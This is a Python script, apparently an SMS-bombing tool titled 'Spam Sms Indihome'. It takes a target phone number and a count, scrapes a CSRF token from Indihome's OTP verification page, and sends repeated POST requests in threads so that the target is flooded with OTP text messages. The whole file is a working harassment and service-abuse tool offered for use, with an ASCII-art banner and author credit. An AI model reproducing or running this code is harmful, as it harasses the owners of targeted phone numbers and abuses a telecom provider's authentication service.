import requests, sys, re
from concurrent.futures import ThreadPoolExecutor
 
 
def gas(no):
	s = requests.Session()
	url = "https://www.indihome.co.id/verifikasi-layanan/login-otp"
	req = s.get(url).text
	token = re.findall(r"name=\"_token\" value=\"(.*?)\"", req)[0]
		
	data = {
	"_token":token,
	"msisdn":no
	}

	spam = s.post(url, data=data).text

	return spam

def main(cnt, no):
	jml = 0
	with ThreadPoolExecutor(max_workers=2) as e:
		futures = []
		for x in range(int(cnt)):
			futures.append(e.submit(gas, no))
		for i, future in enumerate(futures):
			jml += 1
			spam = future.result()
			print(spam)
			if "Gagal!" or "dikirim" in spam:
				print(f"[{jml}] Spammed {no}")
			else:
				print("* ERROR *")
				sys.exit()
	print("")
 
if __name__ == '__main__':
	try:
		print("""\033[1m
                ⠄⠄⠄⠄⠄⠄⠄⢎⢗⣾⠫⡫⢖⢄⠄⠄⠄⠄⠄⠄⠄⠄⠄
                ⠄⠄⠄⠄⠄⢀⡎⠒⠐⠾⠛⠙⣆⡢⠑⢣⠄⠄⠄⠄⠄⠄⠄⠄ 
                ⠄⠄⠄⠄⢠⢾⡦⢒⡁⣰⣿⣿⣦⡐⣳⣩⢇⠄⠄⠄⠄⠄⠄⠄
                ⠄⠄⠄⠄⡾⣢⢭⠔⣴⠒⢺⣿⣯⠥⠑⠑⡾⡄⠄⠄⠄⠄⠄⠄ 
                ⠄⠄⠄⠄⣷⡡⠁⠣⣿⣿⣿⣿⢿⣶⣠⢪⠒⡟⠄⠄⠄⠄⠄⠄ 
                ⠄⠄⠄⢠⡼⠾⡀⡄⣿⣿⢿⡏⢾⡇⣘⡽⠱⢧⡀⠄⠄⠄⠄⠄ 
                ⠄⠄⠄⠄⠉⠉⠱⢦⣘⢿⣾⣶⢟⣠⡀⡄⢔⠏⠁⠄⠄⠄⠄⠄ 
                ⠄⠄⠄⠄⠄⠄⣠⢼⣿⣷⣶⣾⡷⢸⣗⣯⣿⣶⣿⣶⡄⠄⠄⠄ 
                ⠄⠄⣀⣤⣴⣾⣿⣷⣭⣭⣭⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⠄ 
                ⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣸⣿⣿⣧⠄⠄ 
                ⠄⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢻⣿⣿⡄⠄ 
                ⠄⢸⣿⣮⣿⣿⣿⣿⣿⣿⣿⡟⢹⣿⣿⣿⡟⢛⢻⣷⢻⣿⣧⠄
                ⠄⠄⣿⡏⣿⡟⡛⢻⣿⣿⣿⣿⠸⣿⣿⣿⣷⣬⣼⣿⢸⣿⣿⠄
                ⠄⠄⣿⣧⢿⣧⣥⣾⣿⣿⣿⡟⣴⣝⠿⣿⣿⣿⠿⣫⣾⣿⣿⡆
                ⠄⠄⢸⣿⣮⡻⠿⣿⠿⣟⣫⣾⣿⣿⣿⣷⣶⣾⣿⡏⣿⣿⣿⡇ 
                ⠄⠄⢸⣿⣿⣿⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿⡇ 
                ⠄⠄⢸⣿⣿⣿⡇⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⠄ 
                ⠄⠄⣼⣿⣿⣿⢃⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⡇⠄ 
                ⠄⠄⣿⣿⡟⣵⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⣿⣿⢇⣿⣿⡿⠄⠄
   --------------------------------------------------
                  Spam Sms Indihome
                  Coded by \033[31;2mCyber\033[39;2mk4nd4S\033[0;1m
                  ex: 08xxxxxx\033[0m
   --------------------------------------------------
	""")

		no = input("Nomor    : ")
		if(no.isdigit()):
			pass
		else:
			print("Check your number phone!")
			sys.exit()

		if len(no) < 9:
			print("Check your number phone!")
			sys.exit()

		cnt = input("Jumlah    : ")

		if bool(cnt.isdigit()) == 0:
			print("Check your count!")
			sys.exit()
		else:
			print("")
			main(cnt, no)
	except(KeyboardInterrupt, EOFError):
		print("\n")
		sys.exit()
